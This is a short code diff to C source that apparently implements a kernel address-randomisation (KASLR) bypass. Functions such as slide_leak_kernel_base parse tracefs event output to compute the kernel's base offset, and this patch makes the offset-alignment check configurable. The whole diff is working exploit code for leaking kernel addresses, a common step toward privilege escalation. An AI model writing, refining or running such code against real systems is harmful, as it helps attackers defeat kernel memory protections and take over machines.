@@ -4,6 +4,9 @@
 #ifndef SLIDE_TRACEFS_EVENT_ID
 #define SLIDE_TRACEFS_EVENT_ID 109
 #endif
+#ifndef SLIDE_P0_OFFSET_ALIGNMENT
+#define SLIDE_P0_OFFSET_ALIGNMENT 0x10000ULL
+#endif
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -60,7 +63,8 @@ static int slide_tracefs_parse_page(
           KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
       if (caller >= link_caller) {
         uint64_t candidate = caller - link_caller;
-        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+        if (candidate <= 0x1f0000ULL &&
+            (candidate & (SLIDE_P0_OFFSET_ALIGNMENT - 1)) == 0) {
           pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
                      (unsigned long long)caller,
                      (unsigned long long)candidate);
@@ -141,7 +145,7 @@ int slide_leak_kernel_base(void) {
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
     if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+        (value & (SLIDE_P0_OFFSET_ALIGNMENT - 1)) != 0) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
